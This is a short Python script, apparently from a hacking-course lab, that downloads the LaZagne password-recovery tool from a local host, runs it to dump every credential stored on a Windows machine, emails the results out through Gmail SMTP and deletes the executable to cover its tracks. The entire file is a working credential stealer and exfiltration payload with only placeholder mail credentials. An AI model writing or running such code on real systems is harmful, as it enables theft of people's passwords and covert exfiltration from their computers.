#! /usr/bin/env python

import requests
import subprocess
import smtplib
import os
import tempfile


# todo: package all contents of var/www/html/downloads folder into some zip?


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as file:
        file.write(get_response.content)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


os.chdir(tempfile.gettempdir())
# TODO: get newer windows. 7 sucks. it can't even handle this lol.
download("http://10.0.2.15/downlooads/lazagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("example@gmail.com", "password", result)  # fill with necessary data for it to work
os.remove("lazagne.exe")
